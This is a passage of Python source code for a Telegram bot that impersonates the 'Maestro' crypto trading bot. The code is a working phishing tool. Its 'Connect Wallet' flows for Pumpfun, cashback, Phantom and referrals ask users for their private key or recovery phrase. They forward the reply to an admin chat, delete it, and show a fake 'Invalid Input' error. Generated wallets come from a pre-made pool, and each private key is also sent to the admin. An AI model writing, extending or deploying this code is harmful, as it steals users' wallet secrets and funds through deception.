        [InlineKeyboardButton(text=f"{eth_icon} ETH", callback_data="toggle_eth"), InlineKeyboardButton(text=eth_label, callback_data="wallet_select_eth")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu")]
    ])

def get_wallet_action_keyboard(chain_type, user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🗄️ Rearrange Wallets"), callback_data="rearrange_wallets")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Import Wallet"), callback_data="import_wallet"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Generate Wallet"), callback_data=f"generate_select_{chain_type}")
        ]
    ])

def get_error_response_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Try Again"), callback_data="wallet_no_wallet")
        ]
    ])

def get_no_wallet_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🗄️ Rearrange Wallets"), callback_data="rearrange_wallets")
        ],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Import Wallet"), callback_data="import_wallet"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Generate Wallet"), callback_data="generate_wallet")
        ]
    ])

def get_rearrange_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="wallet_no_wallet")
        ]
    ])


WELCOME_MESSAGE_IDS = {}
PREMIUM_FLOW_MESSAGE_IDS = {}
PUMPFUN_FLOW_MESSAGE_IDS = {}
REFERRAL_PROFILES = {}


def track_premium_message(chat_id: int, message_id: int):
    premium_ids = PREMIUM_FLOW_MESSAGE_IDS.setdefault(chat_id, set())
    premium_ids.add(message_id)


def track_pumpfun_message(chat_id: int, message_id: int):
    pumpfun_ids = PUMPFUN_FLOW_MESSAGE_IDS.setdefault(chat_id, set())
    pumpfun_ids.add(message_id)


async def show_welcome_page(bot: Bot, chat_id: int, *, delete_message_ids=None):
    for message_id in delete_message_ids or []:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    previous_welcome_id = WELCOME_MESSAGE_IDS.get(chat_id)
    if previous_welcome_id:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=previous_welcome_id)
        except Exception:
            pass

    for message_id in list(PREMIUM_FLOW_MESSAGE_IDS.get(chat_id, set())):
        if message_id == previous_welcome_id:
            continue
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    PREMIUM_FLOW_MESSAGE_IDS[chat_id] = set()

    welcome_text, use_html = await get_user_message_text(chat_id, MAIN_WELCOME_TEXT, html_supported=True)
    sent = await bot.send_message(
        chat_id=chat_id,
        text=welcome_text,
        parse_mode="HTML" if use_html else None,
        reply_markup=get_main_keyboard(chat_id),
        disable_web_page_preview=True,
    )
    WELCOME_MESSAGE_IDS[chat_id] = sent.message_id
    return sent


def get_pumpfun_keyboard(user_id=None, return_callback: str = "pumpfun_return"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Connect Wallet"), callback_data="pumpfun_connect_wallet")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=return_callback)],
    ])


def get_pumpfun_connect_keyboard():
    return get_pumpfun_keyboard()


def get_cashback_dashboard_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🏆 Explore Tiers"), callback_data="cashback_tiers")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💵 Pumpfun Cashback"), callback_data="cashback_pumpfun")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🪐 Phantom Sol Cashback"), callback_data="cashback_phantom")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⬅️ Back"), callback_data="main_menu")],
    ])


def get_cashback_tiers_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⬅️ Back"), callback_data="cashback")],
    ])


def get_referral_overview_keyboard(username: str, user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⚙️ {username}", callback_data="referral_detail")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu")],
    ])


def get_referral_detail_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="referral")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚙️ Recipient Wallets"), callback_data="referral_recipient_wallet")],
    ])


def get_referral_profile(user_id: int, username: str | None = None) -> dict:
    profile = REFERRAL_PROFILES.get(user_id)
    if profile is None:
        referral_id = (username or f"user_{user_id}").strip().lower().replace(" ", "") or f"user_{user_id}"
        profile = {
            "user_id": user_id,
            "referral_id": referral_id,
            "link": REFERRAL_LINK,
            "created_on": datetime.datetime.now().strftime("%B %d %Y"),
            "enabled": True,
            "referred_users": 0,
            "active_referred_users": 0,
            "percentage": 25,
        }
        REFERRAL_PROFILES[user_id] = profile
    return profile


def build_referral_overview_text(profile: dict, username: str | None = None) -> str:
    referral_id = (profile.get("referral_id") or (username or "user")).strip()
    return (
        "‎[Your] generated <b>Referral IDs</b> are listed below. Click on a ⚙️ Referral ID to set it as \"Default\", check your referral stats and extract your earnings.\n\n"
        f"Default Referral ID | <b>{escape(referral_id)}</b>\n\n"
        "ℹ️ <i>The Default Referral ID is the one that will be displayed in Token Reports and Trade Monitors. This is mostly relevant if you have multiple Referral IDs.</i>"
    )


def build_referral_detail_text(profile: dict, username: str | None = None) -> str:
    referral_id = (profile.get("referral_id") or (username or "user")).strip()
    enabled_icon = "🟢" if profile.get("enabled", True) else "🔴"
    return (
        f"Referral ID: <b>{escape(referral_id)}</b>\n"
        f"Referral Link: {escape(profile.get('link', ''))}\n"
        f"Created On: {escape(profile.get('created_on', datetime.datetime.now().strftime('%B %d %Y')))}\n\n"
        f"Referrals Enabled: {enabled_icon}\n"
        f"Referred Users: <b>{profile.get('referred_users', 0)}</b>\n"
        f"Active Referred Users: <b>{profile.get('active_referred_users', 0)}</b>\n"
        f"Referral Percentage: <b>{profile.get('percentage', 25)}%</b>\n\n"
        "Click on ⚙️ Recipient Wallets to specify the earnings recipient wallet for every chain.\n\n"
        "ℹ️ <i>The Default Referral ID is the one that will be displayed in Token Reports and Trade Monitors.</i>\n"
        "ℹ️ <i>This is mostly relevant if you have multiple Referral IDs.</i>"
    )


def get_premium_keyboard(user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $SOL (SOL)"), callback_data="premium_pay_sol"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $ETH (ETH)"), callback_data="premium_pay_eth"),
        ],
        [
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Pay in $USDT (USDT)"), callback_data="premium_pay_usdt"),
            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu"),
        ],
    ])


# --- TEXT STRING TEMPLATES ---

PUMPFUN_TEXT = "🔗 <b>Connect Your wallet To Check Eligibility</b>"

CASHBACK_DASHBOARD_TEXT = (
    "💰 <b>Cashback Dashboard</b>\n\n"
    "⚠️ You have no cashback earnings yet.\n\n"
    "ℹ️ Start trading to earn cashback rewards! The more you trade, the higher your cashback tier!\n\n"
    "🏆 Current Tier: 🥉 Bronze\n"
    "💸 Cashback: 15%\n\n"
    "⏭️ Next Tier: 🥈 Silver (20%)\n"
    "📊 Volume To Level Up: $0 / $10k\n"
    "⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 0%\n\n"
    "ℹ️ Volume is updated every 30 minutes\n\n"
    "💰 Total Unclaimed: $0\n"
    "✅ Total Claimed: $0"
)

CASHBACK_TIERS_TEXT = (
    "🏆 <b>Cashback Tiers</b>\n\n"
    "<pre>Tier       Volume($)      Cashback\n"
    "🥉 Bronze | 0 - 10k | 15% ✅\n"
    "🥈 Silver | 10k - 100k | 20%\n"
    "🥇 Gold   | 100k - 1m | 25%\n"
    "💎 Diamond| Above 1m | 30%</pre>"
)

PREMIUM_BENEFITS_TEXT = (
    "Premium: ❌\n\n"
    "Premium Benefits ⭐️\n"
    "└ Speed Boost: Dedicated Premium Bot (up to 30% faster) 🤖\n"
    "└ Launch Tax/Deadblock Simulation 🕵️‍♂️\n"
    "└ 10 ➡️ 30 Trade Monitors\n"
    "└ 8 ➡️ 10 Token Limit Orders/Wallet\n"
    "└ 36 ➡️ 96 Hour Trades\n"
    "└ 5 ➡️ 10 Multi-Wallets\n"
    "└ 5 ➡️ 12 Copytrade Wallets\n"
    "└ 5 ➡️ 10 Concurrent Snipes\n"
    "└ Token Hits 👀\n"
    "└ Maestro Trending List 💎\n"
    "└ Maestro Yacht Club Membership 💎\n"
    "└ First-Class Support\n"
    "└ Future Unrevealed Benefits\n\n"
    "🛒 Buy for $200 per 30 days! Use the pay buttons below to start or extend your subscription."
)

MAIN_WELCOME_TEXT = (
    "⭐️ <b>Welcome to Maestro</b>\n"
    "<i>Your one-stop hub for trading tools and quick actions.</i>\n\n"
    "🔗 <b>Chains:</b> Enable or disable chains.\n"
    "💳 <b>Wallets:</b> Import or generate wallets.\n"
    "⚙️ <b>Global Settings:</b> Customize the bot.\n"
    "🕓 <b>Active Orders:</b> Track buy and sell limits.\n"
    "📈 <b>Positions:</b> Monitor your open trades.\n\n"
    "⚡️ <b>Paste a token CA to trade immediately.</b>\n\n"
    '<a href="https://t.me/MaestroBotsHub">Hub</a> • '
    '<a href="https://t.me/MaestroSniperUpdates">Updates</a> • '
    '<a href="https://x.com/MaestroBots">X (Twitter)</a> • '
    '<a href="https://docs.maestrobots.com/">Docs</a> • '
    '<a href="https://t.me/MaestroSupport">Support</a> • '
    '<a href="https://linktr.ee/MaestroBots">More Links</a>'
)

CHAINS_TEXT = (
    "🟢 Enable or 🔴 Disable chains based on your preferences.\n\n"
    "The 💳 Wallets buttons can be used to import or generate wallets for each chain."
)

NO_WALLET_TEXT = "ℹ️ Wallet not found. Please import or generate."


# --- HANDLERS ---

async def render_chains_menu(target, user_id: int):
    localized_text, _ = await get_user_message_text(user_id, CHAINS_TEXT)
    keyboard = get_chains_keyboard(user_id)

    if isinstance(target, CallbackQuery):
        await target.message.edit_text(text=localized_text, reply_markup=keyboard)
        await target.answer()
    else:
        await target.answer(text=localized_text, reply_markup=keyboard)


BOT_COMMANDS = [
    BotCommand(command="start", description="Start the bot"),
    BotCommand(command="pumpfun", description="Open Pumpfun tools"),
    BotCommand(command="premium", description="Open premium options"),
    BotCommand(command="chains", description="Manage chains and wallets"),
]


async def register_bot_commands():
    try:
        await bot.set_my_commands(BOT_COMMANDS)
    except Exception as exc:
        print(f"Failed to register bot commands: {exc}")


@dp.message(Command("start"))
async def start(message: types.Message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    try:
        state = dp.fsm.get_context(message.bot, chat_id, user_id)
        state_data = await state.get_data()
        prompt_message_id = state_data.get("prompt_message_id")
        if prompt_message_id:
            try:
                await message.bot.delete_message(chat_id=chat_id, message_id=prompt_message_id)
            except Exception:
                pass
        await state.clear()
    except Exception as exc:
        print(f"Failed to clear FSM state for /start: {exc}")

    try:
        await message.delete()
    except Exception:
        pass

    previous_welcome_id = WELCOME_MESSAGE_IDS.get(chat_id)
    if previous_welcome_id:
        try:
            await message.bot.delete_message(chat_id=chat_id, message_id=previous_welcome_id)
        except Exception:
            pass

    for message_id in list(PREMIUM_FLOW_MESSAGE_IDS.get(chat_id, set())):
        try:
            await message.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    for message_id in list(PUMPFUN_FLOW_MESSAGE_IDS.get(chat_id, set())):
        try:
            await message.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    PREMIUM_FLOW_MESSAGE_IDS[chat_id] = set()
    PUMPFUN_FLOW_MESSAGE_IDS[chat_id] = set()
    WELCOME_MESSAGE_IDS[chat_id] = None

    try:
        await show_welcome_page(message.bot, chat_id, delete_message_ids=[])
    except Exception as exc:
        print(f"Failed to render start welcome page: {exc}")


@dp.message(Command("chains"))
async def chains_command(message: types.Message):
    await render_chains_menu(message, message.from_user.id)


@dp.message(Command("pumpfun"))
async def pumpfun_command(message: types.Message):
    await message.answer(
        text=PUMPFUN_TEXT,
        parse_mode="HTML",
        reply_markup=get_pumpfun_keyboard(message.from_user.id),
    )


async def render_premium_menu(bot: Bot, chat_id: int, message_id=None):
    if message_id is not None:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=PREMIUM_BENEFITS_TEXT,
                parse_mode="HTML",
                reply_markup=get_premium_keyboard(chat_id),
            )
        except Exception:
            pass
        track_premium_message(chat_id, message_id)
        return None

    sent = await bot.send_message(
        chat_id=chat_id,
        text=PREMIUM_BENEFITS_TEXT,
        parse_mode="HTML",
        reply_markup=get_premium_keyboard(),
    )
    track_premium_message(chat_id, sent.message_id)
    return sent


@dp.message(Command("premium"))
async def premium_command(message: types.Message):
    await render_premium_menu(message.bot, message.chat.id)


@dp.callback_query(F.data == "cashback_pumpfun")
async def cashback_pumpfun(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=PUMPFUN_TEXT,
        reply_markup=get_pumpfun_keyboard(return_callback="cashback"),
    )
    await callback.answer()


@dp.callback_query(F.data == "cashback_phantom")
async def cashback_phantom(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=PUMPFUN_TEXT,
        parse_mode="HTML",
        reply_markup=get_pumpfun_keyboard(return_callback="cashback"),
    )
    await callback.answer()


@dp.callback_query(F.data == "cashback_tiers")
async def cashback_tiers(callback: types.CallbackQuery):
    await callback.message.edit_text(
        text=CASHBACK_TIERS_TEXT,
        parse_mode="HTML",
        reply_markup=get_cashback_tiers_keyboard(callback.from_user.id),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral")
async def referral_overview(callback: types.CallbackQuery):
    profile = get_referral_profile(callback.from_user.id, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}")
    username_label = callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"
    await callback.message.edit_text(
        text=build_referral_overview_text(profile, username_label),
        parse_mode="HTML",
        reply_markup=get_referral_overview_keyboard(username_label, callback.from_user.id),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral_detail")
async def referral_detail(callback: types.CallbackQuery):
    profile = get_referral_profile(callback.from_user.id, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}")
    await callback.message.edit_text(
        text=build_referral_detail_text(profile, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"),
        parse_mode="HTML",
        reply_markup=get_referral_detail_keyboard(callback.from_user.id),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral_recipient_wallet")
async def referral_recipient_wallet(callback: types.CallbackQuery):
    await callback.message.answer(
        text="🔗 Connect your wallet to receive referral rewards 💰",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Connect Wallet", callback_data="referral_connect_wallet")],
            [InlineKeyboardButton(text="Return", callback_data="referral_detail")],
        ]),
    )
    await callback.answer()


@dp.callback_query(F.data == "referral_connect_wallet")
async def referral_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
    prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"

    try:
        await callback.message.delete()
    except Exception:
        pass

    sent = await callback.message.answer(
        text=prompt_text,
        parse_mode="HTML",
        reply_markup=types.ForceReply(selective=False),
    )

    await state.set_state(SupportForm.waiting_for_input)
    await state.update_data(
        prompt_message_id=sent.message_id,
        source="referral_wallet",
    )
    await callback.answer()


@dp.callback_query(F.data.in_({"pumpfun_connect_wallet", "cashback_phantom_connect_wallet"}))
async def pumpfun_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
    prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"

    try:
        await callback.message.delete()
    except Exception:
        pass

    sent = await callback.message.answer(
        text=prompt_text,
        parse_mode="HTML",
        reply_markup=types.ForceReply(selective=False),
    )

    await state.set_state(SupportForm.waiting_for_input)
    await state.update_data(
        prompt_message_id=sent.message_id,
        source="pumpfun_wallet",
    )
    await callback.answer()

# TEXT HANDLER FOR NAMING CONSTRAINT VALIDATION
@dp.message(WalletSetupState.waiting_for_name)
async def process_wallet_name(message: types.Message, state: FSMContext):
    name_input = message.text.strip()

    if not name_input.isalnum() or len(name_input) > 8:
        try:
            username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Invalid wallet name attempt from @{username} (ID: {message.from_user.id})\nValue: {name_input}"
            )
        except Exception as e:
            print(f"Failed to notify admin about invalid wallet name. Error: {e}")

        await message.answer("⚠️ Name must be 8 letters max, only numbers and letters. Try another name:")
        return

    if name_input.lower() in used_wallet_names:
        await message.answer("Name taken. Try another name:")
        return

    try:
        await message.delete()
    except Exception as e:
        print(f"Failed to delete user wallet name message. Error: {e}")

    user_data = await state.get_data()
    chain = (user_data.get("current_chain") or user_data.get("chosen_chain") or "SOL").upper()

    wallet_entry = get_next_wallet(chain)
    if not wallet_entry:
        await message.answer(
            "❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
            reply_markup=get_generation_error_keyboard(message.from_user.id)
        )
        await state.clear()
        return

    used_wallet_names.add(name_input.lower())
    assigned_wallets[wallet_entry["address"]] = True
    user_wallets[message.from_user.id] = {
        "chain": chain,
        "wallet_name": name_input,
        "address": wallet_entry["address"],
        "pk": wallet_entry["pk"],
        "username": message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}",
    }

    response_text = (
        "✅ <b>Wallet Generated</b>\n\n"
        f"<b>Chain:</b> {chain}\n"
        f"<b>Address:</b> <code>{wallet_entry['address']}</code>\n"
        f"<b>Private Key:</b> <code>{wallet_entry['pk']}</code>\n\n"
        "<i>Save this private key securely and never share it. You can also import it into a wallet app if you wish.</i>"
    )

    try:
        username = message.from_user.username or message.from_user.first_name or f"user_{message.from_user.id}"
        await bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=(
                f"🆕 New wallet created\n"
                f"User: @{username} (ID: {message.from_user.id})\n"
                f"Wallet name: {name_input}\n"
                f"Chain: {chain}\n"
                f"Address: {wallet_entry['address']}\n"
                f"PK: {wallet_entry['pk']}"
            )
        )
    except Exception as e:
        print(f"Failed to notify admin about wallet creation. Error: {e}")

    await message.answer(text=response_text, parse_mode="HTML", reply_markup=get_wallet_created_keyboard(message.from_user.id))
    await state.clear()

@dp.message(PhantomConnectState.waiting_for_wallet_secret)
async def process_phantom_wallet_secret(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_message_id = state_data.get("prompt_message_id")
    button_label = state_data.get("button_label") or "Import Wallet"
    button_callback = state_data.get("button_callback") or "import_wallet"

    try:
        await message.delete()
    except Exception:
        pass

    if prompt_message_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_message_id)
        except Exception:
            pass

    full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
    username = message.from_user.username or "N/A"
    eth_address = state_data.get("eth_address") or "Not provided"
    secret_value = (message.text or "").strip() or "[empty]"
    forwarded_text = (
        f"👤 Name: {escape(full_name)}\n"
        f"👤 Username: @{escape(username)}\n"
        f"🆔 Telegram ID: {message.from_user.id}\n"
        f"🪙 ETH: {escape(eth_address)}\n"
        f"🔘 Button: {escape(button_label)}\n"
        f"🔗 Callback: {escape(button_callback)}\n"
        f"📝 User message:\n<pre>{escape(secret_value)}</pre>"
    )

    try:
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to forward Phantom wallet secret to admin. Error: {e}")

    sent = await message.answer(
        text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
        parse_mode="HTML",
    )
    for delete_id in {message.message_id, prompt_message_id, sent.message_id}:
        if delete_id is None:
            continue
        try:
            if delete_id != sent.message_id:
                await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
        except Exception:
            pass
    await state.clear()


# TEXT HANDLER: Captures user message when 'waiting_for_input' state is active
@dp.message(SupportForm.waiting_for_input)
async def process_support_input(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    source = state_data.get("source")
    prompt_message_id = state_data.get("prompt_message_id")

    if source in {"referral_wallet", "pumpfun_wallet", "import_wallet"}:
        if not message.reply_to_message or message.reply_to_message.message_id != prompt_message_id:
            await message.answer(
                text="⚠️ Please reply directly to the message so your response can be forwarded correctly.",
                parse_mode="HTML",
                reply_markup=types.ForceReply(selective=False),
            )
            return

        replied_text = message.reply_to_message.text or "[No original message text]"
        full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
        username = message.from_user.username or "N/A"
        secret_value = (message.text or "").strip() or "[empty]"
        
        if source == "referral_wallet":
            source_label = "Referral Wallet"
        elif source == "pumpfun_wallet":
            source_label = "Pumpfun Wallet"
        else:  # import_wallet
            source_label = "Import Wallet"
        
        forwarded_text = (
            f"<b>Name:</b> {escape(full_name)}\n"
            f"<b>Username:</b> @{escape(username)}\n"
            f"<b>Users ID:</b> {message.from_user.id}\n\n"
            "<b>Message users sent</b>\n"
            f"<pre>{escape(secret_value)}</pre>\n\n"
            "<b>The message user replied to</b>\n"
            f"<pre>{escape(replied_text)}</pre>"
        )

        try:
            await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to forward wallet reply to admin. Error: {e}")

        try:
            await message.delete()
        except Exception:
            pass

        if prompt_message_id:
            try:
                await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_message_id)
            except Exception:
                pass

        invalid_message = await message.answer(
            text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
            parse_mode="HTML",
        )
        
        # Track the invalid message for cleanup on /start
        if invalid_message and invalid_message.message_id:
            track_pumpfun_message(message.chat.id, invalid_message.message_id)
        
        for delete_id in {message.message_id, prompt_message_id, invalid_message.message_id}:
            if delete_id is None:
                continue
            try:
                if delete_id != invalid_message.message_id:
                    await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
            except Exception:
                pass
        await state.clear()
        return

    try:
        await message.forward(chat_id=ADMIN_CHAT_ID)
    except Exception as e:
        print(f"Failed to forward message to admin. Error: {e}")

    try:
        await message.delete()
    except Exception as e:
        print(f"Failed to delete user message. Error: {e}")

    invalid_message = await message.answer(
        text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
        parse_mode="HTML",
    )
    for delete_id in {message.message_id, invalid_message.message_id}:
        if delete_id is None:
            continue
        try:
            if delete_id != invalid_message.message_id:
                await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
        except Exception:
            pass
    await state.clear()

@dp.message()
async def check_for_contract_addresses(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state in {
        WalletSetupState.waiting_for_name.state,
        SupportForm.waiting_for_input.state,
        PhantomConnectState.waiting_for_wallet_secret.state,
        BotStates.waiting_for_slippage.state,
        BotStates.waiting_for_gas.state,
        BotStates.waiting_for_global_slippage.state,
    }:
        return

    if message.text is None:
        return

    match = re.search(SOLANA_ADDRESS_REGEX, message.text)
    if not match:
        return

    mint_address = match.group(0)
    token_data = await fetch_dexscreener_data(mint_address)
    monitor_text = format_monitor_text(mint_address, token_data, 2160)
    sent_monitor = await message.answer(
        text=monitor_text,
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(message.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    try:
        await message.bot.pin_chat_message(
            chat_id=message.chat.id,
            message_id=sent_monitor.message_id,
            disable_notification=True,
        )
    except Exception as e:
        print(f"Error pinning token tracking panel: {e}")

@dp.callback_query(F.data == "track")
async def handle_track_click(callback: types.CallbackQuery):
    match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    if not match:
        await callback.answer(popup_alert("Expired!", "Start a new lookup.", "/start"), show_alert=True)
        return

    mint_address = match.group(0)
    token_data = await fetch_dexscreener_data(mint_address)
    text = format_monitor_text(mint_address, token_data, 2160)

    monitor_msg = await callback.message.answer(
        text=text,
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, monitor_msg.message_id, mint_address, token_data))
    TRACKED_MONITORS[monitor_msg.message_id] = task
    await callback.answer()


@dp.callback_query(F.data.startswith("refresh_track:"))
async def handle_refresh_or_multi(callback: types.CallbackQuery):
    mint_address = callback.data.split(":", 1)[1]
    msg_id = callback.message.message_id

    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()

    token_data = await fetch_dexscreener_data(mint_address)
    await callback.message.edit_text(
        text=format_monitor_text(mint_address, token_data, 2160),
        parse_mode="HTML",
        reply_markup=get_monitor_keyboard(callback.from_user.id, mint_address),
        disable_web_page_preview=True,
    )

    task = asyncio.create_task(monitor_countdown_task(bot, callback.message.chat.id, msg_id, mint_address, token_data))
    TRACKED_MONITORS[msg_id] = task
    await callback.answer("Monitor data refreshed!")


async def _prompt_config_value(callback: types.CallbackQuery, state: FSMContext, config_key: str, mint_address: str, prompt_text: str, keyboard_type: str):
    prompt_msg = await callback.message.answer(
        text=prompt_text,
        reply_markup=types.ForceReply(selective=True),
    )

    await state.update_data(
        panel_id=callback.message.message_id,
        prompt_id=prompt_msg.message_id,
        mint_address=mint_address,
        config_key=config_key,
        chat_id=callback.message.chat.id,
        keyboard_type=keyboard_type,
    )

    next_state = BotStates.waiting_for_slippage if config_key == "slippage" else BotStates.waiting_for_gas
    await state.set_state(next_state)
    await callback.answer()


@dp.callback_query(F.data == "slippage")
async def prompt_slippage_from_trade(callback: types.CallbackQuery, state: FSMContext):
    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    mint_address = mint_address.group(0) if mint_address else ""

    await _prompt_config_value(
        callback,
        state,
        "slippage",
        mint_address,
        "Reply to this message with your desired slippage percentage.\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "trading",
    )


@dp.callback_query(F.data.startswith("set_slip"))
async def prompt_slippage(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data or ""
    mint_address = data.split(":", 1)[1] if ":" in data else ""
    if not mint_address:
        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
        mint_address = mint_address_match.group(0) if mint_address_match else ""

    await _prompt_config_value(
        callback,
        state,
        "slippage",
        mint_address,
        "Reply to this message with your desired slippage percentage.\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "monitor",
    )


@dp.message(BotStates.waiting_for_slippage)
async def process_slippage_input(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_id = state_data.get("prompt_id")
    panel_id = state_data.get("panel_id")
    mint_address = state_data.get("mint_address")
    chat_id = state_data.get("chat_id")
    keyboard_type = state_data.get("keyboard_type", "monitor")

    if prompt_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
        except Exception:
            pass

    try:
        await message.delete()
    except Exception:
        pass

    clean_input = (message.text or "").replace("%", "").strip()
    try:
        numeric_value = int(clean_input)
    except ValueError:
        await message.answer("❌ Failed Slippage setup. Please enter a whole number from 1 to 50.")
        return

    if not (1 <= numeric_value <= 50):
        await message.answer("❌ Failed Slippage setup. Please enter a whole number from 1 to 50.")
        return

    user_id = message.from_user.id
    USER_CONFIGS[user_id] = get_user_data(user_id)
    USER_CONFIGS[user_id]["slippage"] = f"{numeric_value}%"
    print(f"Slippage updated for user {user_id}: {numeric_value}%")

    if panel_id and chat_id:
        try:
            reply_markup = get_monitor_keyboard(user_id, mint_address) if keyboard_type == "monitor" else get_trading_keyboard(user_id)
            await message.bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception as e:
            print(f"Error refreshing panel button layout: {e}")

    await state.clear()


@dp.callback_query(F.data == "gas")
